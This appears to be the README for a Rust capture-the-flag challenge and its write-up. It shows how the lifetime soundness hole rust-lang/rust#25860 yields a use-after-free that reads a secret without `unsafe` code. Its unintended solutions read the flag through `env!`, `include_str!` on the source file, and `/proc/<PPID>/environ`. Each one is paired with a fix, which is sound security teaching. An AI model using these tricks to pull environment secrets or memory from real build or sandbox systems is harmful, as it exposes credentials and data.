# a_happy_life

Demo for a CTF challenge based on [rust-lang/rust#25860](https://github.com/rust-lang/rust/issues/25860).

## Idea

This challenge exploits a unsoundness hole discovered in Rust lifetime deduction system. When a type like `&'a &'b ()` is encountered, the compiler implicitly relies upon `'b: 'a`, which could be broken by contravariance.

See [rust-lang/rust#25860](https://github.com/rust-lang/rust/issues/25860) for the original issue. A more theoretical yet neater explanation can be found on https://counterexamples.org/nearly-universal.html.

## Build environment

* `rustc` on `PATH`. Tested with these compilers:
  * `rustc 1.76.0-nightly (d86d65bbc 2023-12-10)`
  * `rustc 1.74.0 (79e9716c9 2023-11-13) (built from a source tarball)`
* `clippy-driver` on `PATH`. Tested with these `clippy` versions:
  * `clippy 0.1.76 (d86d65bb 2023-12-10)`
* Flag in environment variable `FLAG`

Run this command to start the challenge (either Release or Debug build is okay):

```bash
cargo run -r
# or
cargo run
```

## Problem

Given the following program snippet, find appropriate code to fill in the two blanks (`part_1.in` and `part_2.in`) so as to read variable `_secret` under the conditions that:

* No `unsafe` code allowed
* No references to `_secret`
* No `std` linkage except the global allocator

```rust
// main.rs
#![no_std]
#![allow(clippy::all)]
#![forbid(unsafe_code)]
#![forbid(clippy::disallowed_macros)]

extern crate my_proxy;
extern crate alloc;
use alloc::string::String;

include!("part_1.in");

fn main() {
    let x = include!("part_2.in");
    let _secret = String::from("@@FLAG@@");
    my_proxy::print(&x);
}
```

Crate `my_proxy` is a wrapper crate linked to `std`, but it pulls in only the global allocator and the `println!` macro.

```rust
// my_proxy.rs
pub use std::alloc::System;

#[global_allocator]
static GLOBAL: System = System;

pub fn print(s: &str) {
    println!("my_proxy::print(s: &str) says: {}", s);
}
```

## Solutions

### Intended solution

`part_1.in`:

```rust
// Create "any-to-any" lifetime cast function.
fn aux<'a, 'b, T>(_: Option<&'a &'b ()>, v: &'b T) -> &'a T { v }

fn exp<'c, 'd, T>(x: &'c T) -> &'d T {
    let f: fn(Option<&'d &'d ()>, &'c T) -> &'d T = aux;
    f(None, x)
}
```

`part_2.in`:

```rust
{
    // Create a local variable whose memory location may coincide with `_secret`.
    // The length of the `&'static str` literal should be the same as `_secret`,
    // so as to maximize the likelihood of such coincidence.
    let local = String::from("aaaabaaacaaadaaa");
    // Make the reference dangle!
    exp(&local)
}
```

#### Explanation

The value `local` is dropped once it leaves its scope. But as the compiler thinks that `x`, as a reference to `local`, has a longer lifetime, it dangles after the destruction of `local`. Now, `x` could possibly (in fact, almost always, with `-C opt_level=0` and glibc malloc or Windows HeapAlloc) point to the memory space subsequently allocated for `_secret`, creating a use-after-free scenario.

### Unintended solution 1 (fixed in `v0.1.1`)

`part_1.in`:

```rust

```

`part_2.in`:

```rust
{ env!("FLAG", "what?") }
```

#### Analysis

Macro `core::env!` could be used to fetch env vars at compile time.

#### Fix

Remove exposed `FLAG` env var when calling `rustc`.

### Unintended solution 2 (fixed in `v0.1.2`)

`part_1.in`:

```rust

```

`part_2.in`:

```rust
{ include_str!("main.rs") }
```

#### Analysis

Macro `core::include_str!` could be used to include arbitrary files at compile time.

#### Fix

Add randomized UUID to filename `main.rs`. No other actions are required, since `core::include_str!` will not leak anything else given that the privileges of filesystem are properly set.

### Unintended solution 3 (unconfirmed, fixed in `v0.1.4`)

On the first connection, supply these input:

`part_1.in`:

```rust

```

`part_2.in`:

```rust
{ include_str!("/proc/self/status") }
```

Then write down the parent PID (`PPID`) in the output.

On the second connection, supply these:

`part_1.in`:

```rust

```

`part_2.in`:

```rust
{ include_str!("/proc/<PPID>/environ") }
```

#### Analysis

Trivial.

#### Fix

Ban `core::include_str!` and `core::include_bytes!` with Clippy rules.

